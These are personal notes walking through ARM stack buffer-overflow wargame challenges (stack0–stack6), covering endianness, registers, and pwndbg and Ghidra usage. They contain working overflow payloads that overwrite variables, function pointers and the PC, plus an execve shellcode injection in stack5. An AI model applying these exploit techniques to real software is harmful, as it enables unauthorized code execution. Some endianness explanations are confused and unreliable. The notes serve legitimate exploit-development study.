Remember the disassembly is only half of it
The insturctions on the disassembly does operations on the STACK & registers





[Little Endian]: ""
 + When given a string the characters will be in order from smaller byte to bigger
 String: abcd
 Addresses:          0   1   2   3   4
 Chars of String:    a   b   c   d   e

 + Bytes are in the opposite order
 Byte Value: 0x123456
 Addresses:	         0    1    2  
 Bytes:              56   34   12

[R15(PC)]: Has_address_that_holds_the_address_for_the_next_method

[R11(FP)]: Has_the_address_for_the_BOTTOM_of_the_stack
 - This address should be bigger than R13(SP)

[R13(SP)]: Has_the_address_for_the_TOP_of_the_stack
 - This address should be smaller than R11(FP)





# STACK CHALLENGES (used pwndbg & ghidra)





### stack0: Simple Overflow ------------------------------------------------------------------------
	1. $ gdb stack0
	2. > b main
	3. > run
	4. > n 5  			;do this until you enter the gets
	5. $ python -c "print 'c' * 65"
	6. > {enter the ouput of the above command}
	7. > c



### stack1: Little Endian Lesson -------------------------------------------------------------------
	$ ./stack1 $(python -c "print('c' * 64 + '\x64\x63\x62\x61')")
		 OR
	$ ./stack1 $(python -c "print('c'*64 + 'dcba')")
	The 'dcba' is what you're looking for

	In ghidra you see:
	```
	    char acStack76 [64];
          [...]
	    if (local_c) == 0x61626364 { ''
	```

	Printing 64 'c's fill the buffer. Afterwards you overflow the next variable
	
	0x61626364 is abcd
	My input is taken as is:
	 + the first character is at the smaller address
	 + the last variable is at the largest
	However, the processor will read the overflow chunk "dcba" backwards
	So, I have to give 'dcba' so the processor reads it as 'abcd'


	
### stack2: ----------------------------------------------------------------------------------------
	$ export a=$(python -c "print('c' * 64)")
	$ export b=$(printf '\x0a\x0d\x0a\x0d')   #this will be read backwards as d, a, 0d, 0a
	                                          #the 0 in \x0d will be cut off since we're going backwards,
	                                          #but remember each byte is in order 
	                                          #(so 0xab will be ab, but 0xabcd will be 0xcdab)
	                                          #in this case we're doing this:
	                                          #  0xabcd   ->  dab   ; c is getting cut off since it's the first hex
	                                                                  digit to appear in this
	export GREENIE=$a$b
	./stack2

	In ghidra you see:
	```
		char acStack80 [64];           //the buffer we're gonna overflow by making GREENIE TOO BIG
		int local_10;				   //overflowing this to 0xd0a0d0a
		  [...]
		local_c=getenv("GREENIE");     //this will grab the variable name GREENIE
		  [...]
		 local_10=0;
		 strcpy(acStack80,local_c);   //Takes GREENIE variable and stores it in acStack80
		 if(local_10 == 0xd0a0d0a) {  //This is the vlaue we need local_10 to be
		 							  /
	```




### stack3: Overwrite Funciton Pointer ---------------------------------------------------------------
	$ objdump -d stack3 | grep win
	   0001047c   <-- the address of the win function

	$ a=$(python -c "print('c' * 68)")		;should take you right before the frame pointer(r11)
	$ b=$(printf '\x7c\x04\x01')			;should overwrite the frame pointer(r11)
						    ^this 0 in \x01 will be cut off

    + As before, the stack is of size 64 
    + The value of the function pointer was right below it, so we overwrite that to the win function





### stack4: Overwrite PC register (EIP in x86) -----------------------------------------------------------
    We're targeting the pc register
     1. pop {r11, pc} ; pc is r15
        + The lower number register will be at a lower address (higher up the stack)
        + The bigger number register will be at a higher address (lower in the stack)
        + pc(r15) will get the lower value in stack
        + look where stack is pointing
           pwndbg> telescope $sp
              00:0000│ sp   0x7efff4b0 ◂— 0x61616161 ('aaaa')
              01:0004│      0x7efff4b4 —▸ 0x1044c (win) ◂— 0xe92d4800
        + I'm looking at 0x7efff4b4 since it's the second highest on the stack to go to pc

	$ a=$(python -c "print('c' * 68)")
	$ b=$(printf '\x4c\x04\x01')
			OR
	  b=$(python -c "print '\x4c\x04\x01'")
	$ echo $a$b > arg
	$ gdb stack4
	> break main
	> r < arg
	> ni      ; do this until you see you're going into the win function



### stack5: Standard Overflow ----------------------------------------------------------------------------

Write some shell code (execve3.s)

	Turn into binary
	$ as execve3.s -o execve3.o && ld -N execve3.o -o execve3

	Testing binary
	 ./execve3
	 $ whoami
	 pi

	Turn binary to hex:
	  $ objcopy -O binary execve3 execve3.bin
      $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' execve3.bin 
           OR
      ```
        #!/usr/bin/env python
		import sys
		binary = open(sys.argv[1],'rb')
		for byte in binary.read():
		  sys.stdout.write("\\x"+byte.encode("hex"))
	 	print ""
      ```
      $ ./shellcode.py execve3.bin


	Payload
	 $ a=$(python -c "print('\x90' * 68)") 	 ; The offeset before overwriting pc
	 $ b=$(printf '\xa8\xf4\xff\x7e')  		 ; The target address (0x7efff4a8) we 
	 										 ;  want to redirect to
			OR
	   b=$(python -c "print '\xa8\xf4\xff\x7e'")
	 $ c=$(python -c "print('<output-from-hexdump>')")	; THE SHELL CODE
	 $ echo $a$b$c > arg
	 $ cat arg | ./stack5




### stack6: Code Flow ---------------------------------------------------------------------------------
	$ python -c "print 'a' * 76 + '\xa4\xf4\xff\x7e' + '\x24\x05\x01'" | ./stack6
	
[Explanation]: _
	+ 76 byte offset till the $fp (r12) part of the stack that will be popped into $fp (r11)
	+ The $fp is 0x7efff4a4
	    - Little Endian reads backwards so -> '\xa4\xf4\xff\x7e'
		- We want the $fp to be the same as the $fp during getpath method
		- Cause we're redirecting code flow to the if statment that never gets executed
		  (used ghidra to catch the if statement that uses the `bne` instruction)
    + The $pc is 0x10524
    	- Little Endian reads backwards so -> '\x24\x05\x01'
        - We this address gets popped off the stack, it is put into $pc
        - Points to the contents of the if statment that is never entered
        - Should see the output:
           (bzzzt (0x10578)
        - The hex value is the address of the integer that is used in the if statement checkss

    In ghidra you'll see for the getpath method:
    ```
     void getpath(void)
     {
     	uint in_lr;
     	char acStack84 [72]:   //<------THE STACK TO OVERFLOW
     	printf("input path please:");
     	fflush(stdout);
     	gets(acStack84);
     	if ((in_lr & 0xbf000000) == 0xbf000000) {
     		printf("bzzzt (%p)\n", in_lr);  //<-------UNREACHABLE PART OF IF STATEMENT WITHOUT
     		                                       // CHAGING CODE FLOW
     		_exit(1);
     	}
     	printf("get path %s\n", acStack84);
     	return;
     }
    ```

